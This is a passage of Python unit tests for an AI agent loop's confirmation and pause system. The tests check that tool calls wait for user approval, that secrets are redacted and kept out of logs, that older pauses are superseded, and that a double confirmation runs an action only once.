        self.assertEqual(self.execute_tool.await_count, 0)
        self.assertFalse(any(e.kind == "confirmation" for e in events))
        self.assertTrue(any(
            e.kind == "error" and "could not record" in e.data.get("message", "").lower()
            for e in events
        ))
        turn.refresh_from_db()
        self.assertEqual(turn.state, "failed")

    def test_a_row_write_failure_logs_the_exception_class_not_its_text(self):
        turn = self._turn()
        self._llm([
            _response(
                [_tool("c1", "send_email", {"to": "a@b.c"})],
                stop_reason="tool_use",
            ),
        ])
        secret_detail = "customer-secret-should-not-be-logged"  # nosec B105 — test fixture, not a credential
        with (
            patch(
                "orchestration.agent_loop.save_pending_confirmation",
                new=AsyncMock(side_effect=RuntimeError(secret_detail)),
            ),
            patch("orchestration.agent_loop.logger.error") as log_error,
        ):
            _run(_collect(run_agent_loop(
                user_message="send it", context=self._context(turn), preferences={},
            )))

        logged = " ".join(
            " ".join(str(arg) for arg in call.args)
            for call in log_error.call_args_list
        )
        self.assertNotIn(secret_detail, logged)
        self.assertIn("RuntimeError", logged)

    def test_a_missing_or_mismatched_hash_set_denies(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(turn, [call], state={"pending_args_hashes": {}})
        _run(save_pending_confirmation(
            self.room.id, self.user.id, call, "Send?",
            turn_id=turn.pk, calls=[call],
        ))
        cache.clear()

        events = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        self.assertEqual(self.execute_tool.await_count, 0)
        self.assertTrue(any(e.kind == "error" for e in events))


class SupersedeAndTtlTests(_PauseHarness):
    def test_a_quota_pause_supersedes_an_older_approval_and_clears_it(self):
        from orchestration.llm_client import TokenQuotaExceeded

        older = self._turn()
        call = {"id": "old", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(older, [call])
        newer = self._turn()
        self._llm([TokenQuotaExceeded(1800, reason="limit")])

        events = _run(_collect(run_agent_loop(
            user_message="another task", context=self._context(newer), preferences={},
        )))

        self.assertTrue(any(e.kind == "paused" for e in events))
        older.refresh_from_db()
        newer.refresh_from_db()
        self.assertEqual(older.state, "superseded")
        self.assertIsNone(older.paused_state_enc)
        self.assertEqual((newer.state, newer.pause_kind), ("paused", "quota"))
        self.assertGreaterEqual(
            (newer.pause_expires_at - timezone.now()).total_seconds(),
            _quota_pause_ttl(1800) - 5,
        )

    def test_a_budget_pause_supersedes_an_older_approval(self):
        older = self._turn()
        call = {"id": "old", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(older, [call])
        newer = self._turn()
        self._llm([
            _response(
                [_tool("w1", "get_weather", {"city": "Nairobi"})],
                stop_reason="tool_use",
                usage={"input_tokens": 50, "output_tokens": 50},
            ),
        ])
        with override_settings(AGENT_TURN_TOKEN_BUDGET=10, AGENT_TURN_TOKEN_BUDGET_MAX=100000):
            events = _run(_collect(run_agent_loop(
                user_message="long task", context=self._context(newer), preferences={},
            )))

        self.assertTrue(any(e.kind == "paused" for e in events))
        older.refresh_from_db()
        newer.refresh_from_db()
        self.assertEqual(older.state, "superseded")
        self.assertEqual((newer.state, newer.pause_kind), ("paused", "budget"))

    def test_a_budget_pause_that_cannot_be_saved_does_not_offer_more_budget(self):
        turn = self._turn()
        self._llm([
            _response(
                [_tool("w1", "get_weather", {"city": "Nairobi"})],
                stop_reason="tool_use",
                usage={"input_tokens": 50, "output_tokens": 50},
            ),
        ])
        with (
            override_settings(AGENT_TURN_TOKEN_BUDGET=10, AGENT_TURN_TOKEN_BUDGET_MAX=100000),
            patch(
                "orchestration.agent_loop._persist_pause_state",
                new=AsyncMock(return_value=False),
            ),
        ):
            events = _run(_collect(run_agent_loop(
                user_message="long task", context=self._context(turn), preferences={},
            )))

        sent = " ".join(e.data.get("message", "") for e in events if e.kind == "error")
        self.assertNotIn("more budget", sent.lower())
        self.assertIn("couldn't save", sent.lower())
        turn.refresh_from_db()
        self.assertEqual(turn.state, "failed")

    def test_plaintext_columns_hold_no_raw_arguments_hashes_or_effects(self):
        turn = self._turn()
        call = {
            "id": "c1",
            "name": "send_email",
            "input": {
                "to": "a@b.c",
                "api_key": "sk-live-0123456789abcdef",
                "body": "hello",
            },
        }
        _run(save_pending_confirmation(
            self.room.id, self.user.id, call, "Send it?",
            effects=["to a@b.c", "key sk-live-0123456789abcdef"],
            turn_id=turn.pk, calls=[call],
        ))
        record = WorkflowApprovalRecord.objects.get(kind="agent_loop")
        blob = json.dumps({
            "message": record.approval_message,
            "params": record.sanitized_params,
            "metadata": record.metadata,
        })
        self.assertNotIn("sk-live-0123456789abcdef", blob)
        self.assertNotIn("a@b.c", blob)
        self.assertNotIn("args_hash", record.metadata["calls"][0])
        self.assertNotIn("api_key", record.sanitized_params["calls"][0]["params"])
        self.assertEqual(
            record.sanitized_params["calls"][0]["params"]["to"],
            "[REDACTED EMAIL]",
        )

    def test_pause_keeps_existing_budget_fields_and_binds_ciphertext_to_its_turn(self):
        first = self._turn()
        Turn.objects.filter(pk=first.pk).update(budget={"snapshot": "keep"})
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(first, [call], budget={"token_budget": 5})  # nosec B105 — test fixture, not a credential
        first.refresh_from_db()
        self.assertEqual(first.budget.get("snapshot"), "keep")
        self.assertIn("token_budget", first.budget)
        second = self._turn()
        Turn.objects.filter(pk=second.pk).update(
            paused_state_enc=first.paused_state_enc,
        )
        second.refresh_from_db()
        self.assertIsNone(_run(turns_mod.aget_turn_paused_state(second)))

    def test_a_stale_paused_state_write_loses_the_version_cas(self):
        turn = self._turn()
        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
        self._pause(turn, [call])
        turn.refresh_from_db()
        payload = {"messages": [], "pending_tools": [call]}
        self.assertFalse(turns_mod.update_paused_state(
            turn.pk, payload, expected_version=turn.version - 1,
        ))
        self.assertTrue(turns_mod.update_paused_state(
            turn.pk, payload, expected_version=turn.version,
        ))

    def test_two_yes_on_a_bounded_pause_run_the_action_once(self):
        turn = self._turn()
        call = {"id": "c1", "name": "run_command", "input": {"command": "ls -la"}}
        self._pause(turn, [call], state={
            "pending_tier": "bounded",
            "pending_tiers": ["bounded"],
        })
        _run(save_pending_confirmation(
            self.room.id, self.user.id, call, "Run it?",
            turn_id=turn.pk, calls=[call],
        ))
        self._llm([_response([_text("Done.")])])

        first = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))
        second = _run(_collect(resume_after_confirmation(
            context=self._context(turn), preferences={},
        )))

        self.assertEqual(self.execute_tool.await_count, 1)
        self.assertTrue(any(e.kind == "done" for e in first))
        self.assertTrue(any(e.kind == "error" for e in second))
